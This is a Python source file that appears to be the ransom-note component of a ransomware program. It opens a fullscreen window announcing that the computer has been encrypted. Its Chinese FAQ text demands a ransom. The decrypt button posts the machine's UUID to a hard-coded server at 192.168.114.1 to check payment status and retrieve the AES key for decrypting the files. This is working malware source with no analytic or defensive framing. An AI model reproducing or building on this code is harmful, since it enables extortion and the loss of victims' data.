# coding : utf-8

import base64
from io import BytesIO
import tkinter as tk
from tkinter import messagebox
from PIL import ImageTk, Image
import requests
from decrypt import *
from data import *
import sys



class Interface:

    def button_func(self):
        # 使用本机uuid向服务器获取使用根密钥加密的密钥，用于解密
        aes_key = requests.post("http://192.168.114.1:5000/getKey", data={"uuid": self.uid}).json()

        if aes_key['status'] == 'create':
            messagebox.showinfo('错误！', '您的信息已经丢失，数据将永久无法解密。')
            sys.exit(1)
        elif aes_key['status'] == 'nopay':
            messagebox.showinfo('错误！', base64.b64decode(aes_key['data']).decode('utf-8'))
        elif aes_key['status'] == 'payed':
            messagebox.showinfo('验证成功', '感谢您的配合，已获取到本机密钥，稍后文件将恢复完成。')
            aes_key = base64.b64decode(aes_key['data'])
            decrypt(self.matched_files_full_path, aes_key)
            sys.exit(0)
        else:
            messagebox.showinfo('错误！', '未知错误：' + str(aes_key))
            sys.exit(1)


    def __init__(self, matched_files_full_path, uid):
        self.matched_files_full_path = matched_files_full_path
        self.uid = uid
        # 创建窗口
        width = 400
        height = 300
        self.window = tk.Tk()
        self.window.title("您的电脑已被加密！")
        self.window.geometry(f"{width}x{height}")
        self.window.attributes("-fullscreen", True)



        # 加载图片
        image = Image.open(BytesIO(main_image_bytes))
        image = image.resize((width, height))
        self.photo = ImageTk.PhotoImage(image)

        # 创建标签并显示图片
        self.label = tk.Label(self.window, image=self.photo)
        self.label.pack()




        # 创建文本框
        self.text_box = tk.Text(self.window)
        self.text_box.insert(tk.END, 'Q：我的电脑怎么了？\n')
        self.text_box.insert(tk.END, 'A：您的计算机已感染勒索病毒，所有重要文件已被加密且无法使用。\n\n')
        self.text_box.insert(tk.END, 'Q：我应该如何恢复？\n')
        self.text_box.insert(tk.END, 'A：您必须向特定的地址支付赎金。若您拒绝支付，那么您的文件将永远丢失。\n\n')
        self.text_box.insert(tk.END, 'Q：我该如何支付赎金？\n')
        self.text_box.insert(tk.END, 'A：请点击下方解密按钮恢复您的文件。若您未支付，将向您展示支付地址。\n\n')
        self.text_box.pack()


        button = tk.Button(self.window, text="点击解密", command=self.button_func)
        button.pack()


        # 运行窗口
        self.window.mainloop()
    
    


